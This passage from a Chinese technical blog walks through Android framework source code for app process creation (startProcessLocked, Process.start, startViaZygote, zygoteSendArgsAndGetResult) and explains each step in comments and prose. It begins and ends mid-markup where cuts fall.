class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">startProcessLocked</span><span class="hljs-params">(ProcessRecord app, <span class="hljs-keyword">String</span> hostingType,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">String</span> hostingNameStr, <span class="hljs-keyword">String</span> abiOverride, <span class="hljs-keyword">String</span> entryPoint, <span class="hljs-keyword">String</span>[] entryPointArgs)</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> startTime = SystemClock.<span class="hljs-built_in">elapsedRealtime</span>();<br>        <span class="hljs-comment">//当app的pid大于0且不是当前进程的pid，则从mPidsSelfLocked中移除该app.pid</span><br>        <span class="hljs-keyword">if</span> (app.pid &gt; <span class="hljs-number">0</span> &amp;&amp; app.pid != MY_PID) &#123;<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: removing from pids map&quot;</span>);<br>            <span class="hljs-built_in">synchronized</span> (mPidsSelfLocked) &#123;<br>                mPidsSelfLocked.<span class="hljs-built_in">remove</span>(app.pid);<br>                mHandler.<span class="hljs-built_in">removeMessages</span>(PROC_START_TIMEOUT_MSG, app);<br>            &#125;<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: done removing from pids map&quot;</span>);<br>            app.<span class="hljs-built_in">setPid</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//从mProcessesOnHold移除该app</span><br>        mProcessesOnHold.<span class="hljs-built_in">remove</span>(app);<br><br>        <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: starting to update cpu stats&quot;</span>);<br>        <span class="hljs-built_in">updateCpuStats</span>();<br>        <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: done updating cpu stats&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> userId = UserHandle.<span class="hljs-built_in">getUserId</span>(app.uid);<br>                AppGlobals.<span class="hljs-built_in">getPackageManager</span>().<span class="hljs-built_in">checkPackageStartable</span>(app.info.packageName, userId);<br>                <span class="hljs-comment">//当前package已被冻结,则抛出异常</span><br>            &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RemoteException e) &#123;<br>                <span class="hljs-keyword">throw</span> e.<span class="hljs-built_in">rethrowAsRuntimeException</span>();<br>            &#125;<br><br>            <span class="hljs-keyword">int</span> uid = app.uid;<br>            <span class="hljs-keyword">int</span>[] gids = null;<br>            <span class="hljs-keyword">int</span> mountExternal = Zygote.MOUNT_EXTERNAL_NONE;<br>            <span class="hljs-keyword">if</span> (!app.isolated) &#123;<br>                <span class="hljs-keyword">int</span>[] permGids = null;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: getting gids from package manager&quot;</span>);<br>                    <span class="hljs-comment">//通过Package Manager获取gids</span><br>                    <span class="hljs-keyword">final</span> IPackageManager pm = AppGlobals.<span class="hljs-built_in">getPackageManager</span>();<br>                    permGids = pm.<span class="hljs-built_in">getPackageGids</span>(app.info.packageName,<br>                            MATCH_DEBUG_TRIAGED_MISSING, app.userId);<br>                    MountServiceInternal mountServiceInternal = LocalServices.<span class="hljs-built_in">getService</span>(<br>                            MountServiceInternal.class);<br>                    mountExternal = mountServiceInternal.<span class="hljs-built_in">getExternalStorageMountMode</span>(uid,<br>                            app.info.packageName);<br>                &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RemoteException e) &#123;<br>                    <span class="hljs-keyword">throw</span> e.<span class="hljs-built_in">rethrowAsRuntimeException</span>();<br>                &#125;<br><br>      <br>                 <span class="hljs-comment">//添加APP和配置文件GID，以便app可以共享某些资源</span><br>                <span class="hljs-keyword">if</span> (ArrayUtils.<span class="hljs-built_in">isEmpty</span>(permGids)) &#123;<br>                    gids = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">2</span>];<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    gids = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[permGids.length + <span class="hljs-number">2</span>];<br>                    System.<span class="hljs-built_in">arraycopy</span>(permGids, <span class="hljs-number">0</span>, gids, <span class="hljs-number">2</span>, permGids.length);<br>                &#125;<br>                gids[<span class="hljs-number">0</span>] = UserHandle.<span class="hljs-built_in">getSharedAppGid</span>(UserHandle.<span class="hljs-built_in">getAppId</span>(uid));<br>                gids[<span class="hljs-number">1</span>] = UserHandle.<span class="hljs-built_in">getUserGid</span>(UserHandle.<span class="hljs-built_in">getUserId</span>(uid));<br>            &#125;<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: building args&quot;</span>);<br>            <br>            ......<br><br>            app.gids = gids;<br>            app.requiredAbi = requiredAbi;<br>            app.instructionSet = instructionSet;<br>            <br>......<br><br>            <span class="hljs-comment">// 请求zygote创建进程，成功后会返回新进程的pid，否则会抛出异常</span><br>            <span class="hljs-comment">//ProcessStartResult是Process内部类，封装了启动进程的结果</span><br>            <span class="hljs-comment">//这是一个阻塞过程</span><br>            <span class="hljs-built_in">Process</span>.ProcessStartResult startResult = <span class="hljs-built_in">Process</span>.<span class="hljs-built_in">start</span>(entryPoint,<br>                    app.processName, uid, uid, gids, debugFlags, mountExternal,<br>                    app.info.targetSdkVersion, app.info.seinfo, requiredAbi, instructionSet,<br>                    app.info.dataDir, entryPointArgs);<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: returned from zygote!&quot;</span>);<br>            Trace.<span class="hljs-built_in">traceEnd</span>(Trace.TRACE_TAG_ACTIVITY_MANAGER);<br><br>            ......<br>            <br>            <span class="hljs-comment">//重置ProcessRecord的成员变量</span><br>            app.<span class="hljs-built_in">setPid</span>(startResult.pid);<br>            app.usingWrapper = startResult.usingWrapper;<br>            app.removed = <span class="hljs-literal">false</span>;<br>            app.killed = <span class="hljs-literal">false</span>;<br>            app.killedByAm = <span class="hljs-literal">false</span>;<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: starting to update pids map&quot;</span>);<br>            <br>            <span class="hljs-built_in">synchronized</span> (mPidsSelfLocked) &#123;<br>                ProcessRecord oldApp;<br>                <span class="hljs-comment">// 如果已经有一个app占用了这个尚未清理的pid</span><br>                <span class="hljs-keyword">if</span> ((oldApp = mPidsSelfLocked.<span class="hljs-built_in">get</span>(startResult.pid)) != null &amp;&amp; !app.isolated) &#123;<br>                    <span class="hljs-comment">// 清理与此pid相关联的内容   </span><br>                    <span class="hljs-built_in">cleanUpApplicationRecordLocked</span>(oldApp, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">-1</span>,<br>                            <span class="hljs-literal">true</span> <span class="hljs-comment">/*replacingPid*/</span>);<br>                &#125;<br>                <span class="hljs-comment">//将新创建的进程添加到mPidsSelfLocked</span><br>                <span class="hljs-keyword">this</span>.mPidsSelfLocked.<span class="hljs-built_in">put</span>(startResult.pid, app);<br>                <span class="hljs-keyword">if</span> (isActivityProcess) &#123;<br>                    Message msg = mHandler.<span class="hljs-built_in">obtainMessage</span>(PROC_START_TIMEOUT_MSG);<br>                    msg.obj = app;<br>                    mHandler.<span class="hljs-built_in">sendMessageDelayed</span>(msg, startResult.usingWrapper<br>                            ? PROC_START_TIMEOUT_WITH_WRAPPER : PROC_START_TIMEOUT);<br>                &#125;<br>            &#125;<br>            <span class="hljs-built_in">checkTime</span>(startTime, <span class="hljs-string">&quot;startProcess: done updating pids map&quot;</span>);<br>        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (RuntimeException e) &#123;<br>            <span class="hljs-comment">// 创建进程失败了，一个常见的情况是由于主动升级导致包被冻结</span><br>            forceStopPackageLocked(app.info.packageName, UserHandle.<span class="hljs-built_in">getAppId</span>(app.uid), <span class="hljs-literal">false</span>,<br>                    <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, UserHandle.<span class="hljs-built_in">getUserId</span>(app.userId), <span class="hljs-string">&quot;start failure&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法中最重要的就是通过Process.start来创建应用进程；原理是通过socket向Zygote进程发送创建新进程的请求；Zygote进程启动后有一个runSelectLoop循环，当收到客户端请求便会执行ZygoteConnection.runOnce()方法，再经过层层调用后fork出新的应用进程，创建新进程后将ActivityThread类加载到新进程，并调用ActivityThread.main()方法</p><h4 id="3-3-3-Process-start"><a href="#3-3-3-Process-start" class="headerlink" title="3.3.3 Process.start()"></a>3.3.3 Process.start()</h4><p>源码位于frameworks/base/core/java/android/os/Process.java</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//开启一个新的进程</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ProcessStartResult <span class="hljs-title">start</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> processClass,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> niceName,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">int</span> uid, <span class="hljs-keyword">int</span> gid, <span class="hljs-keyword">int</span>[] gids,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">int</span> debugFlags, <span class="hljs-keyword">int</span> mountExternal,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">int</span> targetSdkVersion,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">String</span> seInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">String</span> abi,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">String</span> instructionSet,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">String</span> appDataDir,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">String</span>[] zygoteArgs)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">startViaZygote</span>(processClass, niceName, uid, gid, gids,<br>                    debugFlags, mountExternal, targetSdkVersion, seInfo,<br>                    abi, instructionSet, appDataDir, zygoteArgs);<br>        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (ZygoteStartFailedEx ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<br>                    <span class="hljs-string">&quot;Starting VM process through Zygote failed&quot;</span>, ex);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-4-Process-startViaZygote"><a href="#3-3-4-Process-startViaZygote" class="headerlink" title="3.3.4 Process.startViaZygote()"></a>3.3.4 Process.startViaZygote()</h4><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-comment">//通过zygote机制启动新进程</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ProcessStartResult startViaZygote(<span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> processClass,<br>                                 <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> niceName,<br>                                 <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> uid, <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> gid,<br>                                 <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span>[] gids,<br>                                 <span class="hljs-built_in">int</span> debugFlags, <span class="hljs-built_in">int</span> mountExternal,<br>                                 <span class="hljs-built_in">int</span> targetSdkVersion,<br>                                 <span class="hljs-keyword">String</span> seInfo,<br>                                 <span class="hljs-keyword">String</span> abi,<br>                                 <span class="hljs-keyword">String</span> instructionSet,<br>                                 <span class="hljs-keyword">String</span> appDataDir,<br>                                 <span class="hljs-keyword">String</span>[] extraArgs)<br>                                 <span class="hljs-keyword">throws</span> ZygoteStartFailedEx &#123;<br>       <span class="hljs-keyword">synchronized</span>(Process.class) &#123;<br>           ArrayList&lt;<span class="hljs-keyword">String</span>&gt; argsForZygote = <span class="hljs-keyword">new</span> ArrayList&lt;<span class="hljs-keyword">String</span>&gt;();<br><br>           <span class="hljs-comment">// 主要工作是生成argsForZygote数组，该数组保存了进程的uid、gid、groups、target-sdk、nice-name等一系列的参数</span><br>           argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--runtime-args&quot;</span>);<br>           argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--setuid=&quot;</span> + uid);<br>           argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--setgid=&quot;</span> + gid);<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ENABLE_JNI_LOGGING) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--enable-jni-logging&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ENABLE_SAFEMODE) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--enable-safemode&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ENABLE_DEBUGGER) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--enable-debugger&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ENABLE_CHECKJNI) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--enable-checkjni&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_GENERATE_DEBUG_INFO) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--generate-debug-info&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ALWAYS_JIT) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--always-jit&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_NATIVE_DEBUGGABLE) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--native-debuggable&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> ((debugFlags &amp; Zygote.DEBUG_ENABLE_ASSERT) != <span class="hljs-number">0</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--enable-assert&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">if</span> (mountExternal == Zygote.MOUNT_EXTERNAL_DEFAULT) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--mount-external-default&quot;</span>);<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mountExternal == Zygote.MOUNT_EXTERNAL_READ) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--mount-external-read&quot;</span>);<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mountExternal == Zygote.MOUNT_EXTERNAL_WRITE) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--mount-external-write&quot;</span>);<br>           &#125;<br>           argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--target-sdk-version=&quot;</span> + targetSdkVersion);<br><br>           <span class="hljs-comment">//TODO optionally enable debuger</span><br>           <span class="hljs-comment">//argsForZygote.add(&quot;--enable-debugger&quot;);</span><br><br>           <span class="hljs-comment">// --setgroups is a comma-separated list</span><br>           <span class="hljs-keyword">if</span> (gids != <span class="hljs-keyword">null</span> &amp;&amp; gids.length &gt; <span class="hljs-number">0</span>) &#123;<br>               StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>               sb.<span class="hljs-built_in">append</span>(<span class="hljs-string">&quot;--setgroups=&quot;</span>);<br><br>               <span class="hljs-built_in">int</span> sz = gids.length;<br>               <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; sz; i++) &#123;<br>                   <span class="hljs-keyword">if</span> (i != <span class="hljs-number">0</span>) &#123;<br>                       sb.<span class="hljs-built_in">append</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>                   &#125;<br>                   sb.<span class="hljs-built_in">append</span>(gids[i]);<br>               &#125;<br><br>               argsForZygote.<span class="hljs-built_in">add</span>(sb.toString());<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (niceName != <span class="hljs-keyword">null</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--nice-name=&quot;</span> + niceName);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (seInfo != <span class="hljs-keyword">null</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--seinfo=&quot;</span> + seInfo);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (instructionSet != <span class="hljs-keyword">null</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--instruction-set=&quot;</span> + instructionSet);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (appDataDir != <span class="hljs-keyword">null</span>) &#123;<br>               argsForZygote.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;--app-data-dir=&quot;</span> + appDataDir);<br>           &#125;<br><br>           argsForZygote.<span class="hljs-built_in">add</span>(processClass);<br><br>           <span class="hljs-keyword">if</span> (extraArgs != <span class="hljs-keyword">null</span>) &#123;<br>               <span class="hljs-keyword">for</span> (<span class="hljs-keyword">String</span> arg : extraArgs) &#123;<br>                   argsForZygote.<span class="hljs-built_in">add</span>(arg);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> zygoteSendArgsAndGetResult(openZygoteSocketIfNeeded(abi), argsForZygote);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="3-3-5-Process-zygoteSendArgsAndGetResult"><a href="#3-3-5-Process-zygoteSendArgsAndGetResult" class="headerlink" title="3.3.5 Process.zygoteSendArgsAndGetResult()"></a>3.3.5 Process.zygoteSendArgsAndGetResult()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ProcessStartResult <span class="hljs-title">zygoteSendArgsAndGetResult</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            ZygoteState zygoteState, ArrayList&lt;<span class="hljs-keyword">String</span>&gt; args)</span></span><br><span class="hljs-function">            throws ZygoteStartFailedEx </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 如果参数格式错误，就尽早抛出异常.</span><br>            <span class="hljs-keyword">int</span> sz = args.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; sz; i++) &#123;<br>                <span class="hljs-keyword">if</span> (args.<span class="hljs-built_in">get</span>(i).<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&#x27;\n&#x27;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ZygoteStartFailedEx</span>(<span class="hljs-string">&quot;embedded newlines not allowed&quot;</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 这里就是通过输出流将参数列表写出去</span><br><span class="hljs-comment">             * 获取输入流得到创建进程结果</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">final</span> BufferedWriter writer = zygoteState.writer;<br>            <span class="hljs-keyword">final</span> DataInputStream inputStream = zygoteState.inputStream;<br><br>            writer.<span class="hljs-built_in">write</span>(Integer.<span class="hljs-built_in">toString</span>(args.<span class="hljs-built_in">size</span>()));<br>            writer.<span class="hljs-built_in">newLine</span>();<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; sz; i++) &#123;<br>                <span class="hljs-keyword">String</span> arg = args.<span class="hljs-built_in">get</span>(i);<br>                writer.<span class="hljs-built_in">write</span>(arg);<br>                writer.<span class="hljs-built_in">newLine</span>();<br>            &#125;<br><br>            writer.<span class="hljs-built_in">flush</span>();<br><br>            <span class="hljs-comment">// 等待socket返回，这里是否需要设置超时时间，google也在考虑，但是暂时没有加</span><br>            ProcessStartResult result = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ProcessStartResult</span>();<br>            result.pid = inputStream.<span class="hljs-built_in">readInt</span>();<br>            result.usingWrapper = inputStream.<span class="hljs-built_in">readBoolean</span>();<br><br>            <span class="hljs-keyword">if</span> (result.pid &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//创建进程失败，抛出异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ZygoteStartFailedEx</span>(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (IOException ex) &#123;<br>            zygoteState.<span class="hljs-built_in">close</span>();<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ZygoteStartFailedEx</span>(ex);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法作用就是通过Socket向zygote进程发送一个参数列表，然后就进入阻塞状态，直到远程Socket服务端返回新创建的进程pid</p><p>说到这里我们好像没有见到Socket的影子，只见到了ZygoteState这么一个东西，那它怎么来的呢，可以看见它是上一个方法startViaZygote调用zygoteSendArgsAndGetResult方法传过来的参数，就是这么一句话</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ProcessStartResult <span class="hljs-title">startViaZygote</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> processClass,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span> niceName,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> uid, <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> gid,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span>[] gids,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">int</span> debugFlags, <span class="hljs-keyword">int</span> mountExternal,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">int</span> targetSdkVersion,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">String</span> seInfo,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">String</span> abi,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">String</span> instructionSet,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 <span class="hljs-keyword">String</span> appDataDir,</span></span><br><span 